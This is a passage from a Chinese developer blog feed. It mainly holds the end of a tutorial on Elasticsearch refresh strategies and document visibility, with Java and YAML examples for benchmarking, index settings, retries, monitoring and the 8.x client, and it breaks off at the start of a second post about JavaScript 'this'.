    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">benchmark</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        Map&lt;String, Long&gt; results = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        
        <span class="hljs-comment">// 测试不同刷新策略的性能</span>
        List&lt;RefreshStrategy&gt; strategies = Arrays.asList(
            RefreshStrategy.IMMEDIATE,
            RefreshStrategy.WAIT_UNTIL,
            RefreshStrategy.NONE
        );
        
        <span class="hljs-keyword">for</span> (RefreshStrategy strategy : strategies) {
            <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
            
            <span class="hljs-comment">// 插入1000个文档</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
                createDocumentWithRefreshPolicy(strategy);
            }
            
            <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;
            results.put(strategy.name(), duration);
            
            System.out.println(String.format(
                <span class="hljs-string">"策略 %s: %d 毫秒"</span>, strategy.name(), duration));
        }
        
        <span class="hljs-comment">// 预期结果：NONE &lt; WAIT_UNTIL &lt; IMMEDIATE</span>
    }
}
</code></pre>
<h4 data-id="heading-12">3.2 最佳实践指南</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ElasticsearchBestPractices</span> {
    
    <span class="hljs-comment">// 实践1：根据场景选择策略</span>
    <span class="hljs-keyword">public</span> RefreshStrategy <span class="hljs-title function_">chooseStrategy</span><span class="hljs-params">(Scenario scenario)</span> {
        <span class="hljs-keyword">switch</span> (scenario) {
            <span class="hljs-keyword">case</span> TESTING:  <span class="hljs-comment">// 测试环境</span>
                <span class="hljs-keyword">return</span> RefreshStrategy.IMMEDIATE;
                
            <span class="hljs-keyword">case</span> REALTIME_APP:  <span class="hljs-comment">// 实时应用</span>
                <span class="hljs-keyword">return</span> RefreshStrategy.WAIT_UNTIL;
                
            <span class="hljs-keyword">case</span> BATCH_PROCESSING:  <span class="hljs-comment">// 批量处理</span>
                <span class="hljs-keyword">return</span> RefreshStrategy.NONE;
                
            <span class="hljs-keyword">case</span> MIXED_WORKLOAD:  <span class="hljs-comment">// 混合负载</span>
            <span class="hljs-keyword">default</span>:
                <span class="hljs-comment">// 默认策略，平衡性能与实时性</span>
                <span class="hljs-keyword">return</span> RefreshStrategy.WAIT_UNTIL;
        }
    }
    
    <span class="hljs-comment">// 实践2：使用索引设置优化</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">optimizeIndexSettings</span><span class="hljs-params">(RestHighLevelClient client)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">UpdateSettingsRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateSettingsRequest</span>(<span class="hljs-string">"my_index"</span>);
        
        Settings.<span class="hljs-type">Builder</span> <span class="hljs-variable">settings</span> <span class="hljs-operator">=</span> Settings.builder()
            <span class="hljs-comment">// 调整刷新间隔（根据业务需求）</span>
            .put(<span class="hljs-string">"index.refresh_interval"</span>, <span class="hljs-string">"2s"</span>)
            <span class="hljs-comment">// 优化写入性能</span>
            .put(<span class="hljs-string">"index.translog.sync_interval"</span>, <span class="hljs-string">"5s"</span>)
            .put(<span class="hljs-string">"index.translog.durability"</span>, <span class="hljs-string">"async"</span>);
        
        request.settings(settings);
        client.indices().putSettings(request, RequestOptions.DEFAULT);
    }
    
    <span class="hljs-comment">// 实践3：实现智能重试机制</span>
    <span class="hljs-keyword">public</span> SearchResponse <span class="hljs-title function_">searchWithRetry</span><span class="hljs-params">(
            SearchRequest searchRequest,
            <span class="hljs-type">int</span> maxRetries)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException {
        
        <span class="hljs-type">IOException</span> <span class="hljs-variable">lastException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; maxRetries; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">SearchResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> client.search(
                    searchRequest, RequestOptions.DEFAULT);
                    
                <span class="hljs-comment">// 验证是否找到预期的文档</span>
                <span class="hljs-keyword">if</span> (response.getHits().getTotalHits().value &gt; <span class="hljs-number">0</span>) {
                    <span class="hljs-keyword">return</span> response;
                }
                
                <span class="hljs-comment">// 未找到，等待后重试</span>
                Thread.sleep(<span class="hljs-number">100</span> * (i + <span class="hljs-number">1</span>)); <span class="hljs-comment">// 递增等待时间</span>
                
            } <span class="hljs-keyword">catch</span> (IOException e) {
                lastException = e;
                Thread.sleep(<span class="hljs-number">1000</span>); <span class="hljs-comment">// 发生错误时等待更久</span>
            }
        }
        
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">"搜索失败，最大重试次数已达"</span>, lastException);
    }
}
</code></pre>
<h4 data-id="heading-13">3.3 生产环境配置示例</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># elasticsearch.yml 生产配置参考</span>
<span class="hljs-comment"># 写入优化配置</span>
<span class="hljs-attr">index.refresh_interval:</span> <span class="hljs-string">2s</span>  <span class="hljs-comment"># 根据业务容忍度调整</span>
<span class="hljs-attr">index.translog.durability:</span> <span class="hljs-string">async</span>
<span class="hljs-attr">index.translog.sync_interval:</span> <span class="hljs-string">5s</span>
<span class="hljs-attr">index.number_of_replicas:</span> <span class="hljs-number">1</span>  <span class="hljs-comment"># 写入时减少副本数，写完再增加</span>

<span class="hljs-comment"># Java客户端配置</span>
<span class="hljs-string">public</span> <span class="hljs-string">class</span> <span class="hljs-string">ElasticsearchConfig</span> {
    
    <span class="hljs-string">@Bean</span>
    <span class="hljs-string">public</span> <span class="hljs-string">RestHighLevelClient</span> <span class="hljs-string">elasticsearchClient()</span> {
        <span class="hljs-string">RestClientBuilder</span> <span class="hljs-string">restClientBuilder</span> <span class="hljs-string">=</span> <span class="hljs-string">RestClient.builder(</span>
            <span class="hljs-string">new</span> <span class="hljs-string">HttpHost("localhost"</span>, <span class="hljs-number">9200</span>, <span class="hljs-string">"http"</span><span class="hljs-string">));</span>
        
        <span class="hljs-string">//</span> <span class="hljs-string">配置连接池</span>
        <span class="hljs-string">restClientBuilder.setHttpClientConfigCallback(httpClientBuilder</span> <span class="hljs-string">-&gt;</span> {
            <span class="hljs-string">return</span> <span class="hljs-string">httpClientBuilder</span>
                <span class="hljs-string">.setMaxConnTotal(100)</span>    <span class="hljs-string">//</span> <span class="hljs-string">最大连接数</span>
                <span class="hljs-string">.setMaxConnPerRoute(50);</span> <span class="hljs-string">//</span> <span class="hljs-string">每路由最大连接数</span>
        }<span class="hljs-string">);</span>
        
        <span class="hljs-string">//</span> <span class="hljs-string">配置请求超时</span>
        <span class="hljs-string">restClientBuilder.setRequestConfigCallback(requestConfigBuilder</span> <span class="hljs-string">-&gt;</span> {
            <span class="hljs-string">return</span> <span class="hljs-string">requestConfigBuilder</span>
                <span class="hljs-string">.setConnectTimeout(5000)</span>
                <span class="hljs-string">.setSocketTimeout(60000);</span>
        }<span class="hljs-string">);</span>
        
        <span class="hljs-string">return</span> <span class="hljs-string">new</span> <span class="hljs-string">RestHighLevelClient(restClientBuilder);</span>
    }
}
</code></pre>
<h3 data-id="heading-14">四、常见问题与解决方案</h3>
<h4 data-id="heading-15">Q1：刷新操作会影响集群性能吗？</h4>
<p><strong>A：</strong> 会。每次刷新都会创建新的段（segment），增加合并压力。建议：</p>
<ul>
<li>生产环境避免频繁强制刷新</li>
<li>合理设置refresh_interval</li>
<li>使用WAIT_UNTIL策略而非IMMEDIATE</li>
</ul>
<h4 data-id="heading-16">Q2：如何监控刷新性能？</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RefreshMonitor</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorRefreshStats</span><span class="hljs-params">(RestHighLevelClient client)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">IndicesStatsRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IndicesStatsRequest</span>();
        request.all();  <span class="hljs-comment">// 获取所有统计信息</span>
        
        <span class="hljs-type">IndicesStatsResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> 
            client.indices().stats(request, RequestOptions.DEFAULT);
        
        <span class="hljs-comment">// 刷新统计</span>
        <span class="hljs-type">RefreshStats</span> <span class="hljs-variable">refreshStats</span> <span class="hljs-operator">=</span> response.getTotal().getRefresh();
        System.out.println(<span class="hljs-string">"总刷新次数: "</span> + refreshStats.getTotal());
        System.out.println(<span class="hljs-string">"刷新总时间(ms): "</span> + refreshStats.getTotalTimeInMillis());
        System.out.println(<span class="hljs-string">"外部刷新次数: "</span> + refreshStats.getExternalTotal());
    }
}
</code></pre>
<h4 data-id="heading-17">Q3：使用新客户端（Java API Client 8.x）有什么变化？</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Elasticsearch Java API Client 8.x 示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Elasticsearch8Example</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCreateDocument</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// 新客户端API更加类型安全</span>
        <span class="hljs-type">ElasticsearchClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ElasticsearchClient</span>(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestClientTransport</span>(restClient, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JacksonJsonpMapper</span>()));
        
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(<span class="hljs-string">"bk-1"</span>, <span class="hljs-string">"City Bike"</span>, <span class="hljs-number">123.0</span>);
        
        IndexResponse&lt;Product&gt; response = client.index(i -&gt; i
            .index(<span class="hljs-string">"products"</span>)
            .id(product.getSku())
            .document(product)
            .refresh(Refresh.True)  <span class="hljs-comment">// 设置刷新策略</span>
        );
        
        <span class="hljs-comment">// 文档现在立即可见</span>
        assertTrue(response.shards().failures().isEmpty());
    }
}
</code></pre>
<h3 data-id="heading-18">五、总结与建议</h3>
<h4 data-id="heading-19">5.1 关键要点回顾</h4>
<ol>
<li><strong>理解原理</strong>：Elasticsearch的NRT机制是性能与实时性的权衡</li>
<li><strong>策略选择</strong>：
<ul>
<li>测试环境 → 使用<code>IMMEDIATE</code>刷新</li>
<li>生产环境 → 使用<code>WAIT_UNTIL</code>或调整<code>refresh_interval</code></li>
<li>批量导入 → 使用<code>NONE</code>，完成后手动刷新</li>
</ul>
</li>
<li><strong>监控优化</strong>：持续监控刷新指标，根据业务调整参数</li>
</ol>
<h4 data-id="heading-20">5.2 实用建议</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ElasticsearchTips</span> {
    
    <span class="hljs-comment">// 提示1：使用统一工具类</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DocumentUtils</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> IndexRequest <span class="hljs-title function_">buildIndexRequest</span><span class="hljs-params">(
                String index, String id, Object source)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IndexRequest</span>(index)
                .id(id)
                .source(convertToMap(source), XContentType.JSON)
                .setRefreshPolicy(RefreshPolicy.WAIT_UNTIL);
        }
    }
    
    <span class="hljs-comment">// 提示2：实现环境感知配置</span>
    <span class="hljs-meta">@Configuration</span>
    <span class="hljs-meta">@Profile("prod")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProdElasticsearchConfig</span> {
        <span class="hljs-meta">@Value("${es.refresh.interval:2s}")</span>
        <span class="hljs-keyword">private</span> String refreshInterval;
        
        <span class="hljs-meta">@PostConstruct</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
            System.out.println(<span class="hljs-string">"生产环境刷新间隔: "</span> + refreshInterval);
        }
    }
}
</code></pre>
<h4 data-id="heading-21">5.3 进一步学习资源</h4>
<ol>
<li>官方文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fguide%2Fen%2Felasticsearch%2Freference%2Fcurrent%2Findices-refresh.html" target="_blank" title="https://www.elastic.co/guide/en/elasticsearch/reference/current/indices-refresh.html" ref="nofollow noopener noreferrer">Elasticsearch Refresh API</a></li>
<li>性能调优指南：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fguide%2Fen%2Felasticsearch%2Freference%2Fcurrent%2Ftune-for-indexing-speed.html" target="_blank" title="https://www.elastic.co/guide/en/elasticsearch/reference/current/tune-for-indexing-speed.html" ref="nofollow noopener noreferrer">Elasticsearch Tuning for Indexing Speed</a></li>
<li>实战书籍：《Elasticsearch实战》</li>
</ol>
<hr/>
<p><strong>记住</strong>：Elasticsearch的"近实时"设计是一种权衡。理解并正确使用刷新机制，才能在性能和数据实时性之间找到适合你业务的最佳平衡点。</p>
<p>希望这篇博客能帮助你解决文档可见性的问题！如果有更多疑问，欢迎在评论区讨论。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[this 不是你想的 this：从作用域迷失到调用栈掌控]]></title>    <link>https://juejin.cn/post/7579819594271014950</link>    <guid>https://juejin.cn/post/7579819594271014950</guid>    <pubDate>2025-12-04T09:41:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579819594271014950" data-draft-id="7579511003299151915" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="this 不是你想的 this：从作用域迷失到调用栈掌控"/> <meta itemprop="keywords" content="JavaScript,面试,ECMAScript 6"/> <meta itemprop="datePublished" content="2025-12-04T09:41:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="有意义"/> <meta itemprop="url" content="https://juejin.cn/user/1739866211617625"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            this 不是你想的 this：从作用域迷失到调用栈掌控
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1739866211617625/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    有意义
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:41:33.000Z" title="Thu Dec 04 2025 09:41:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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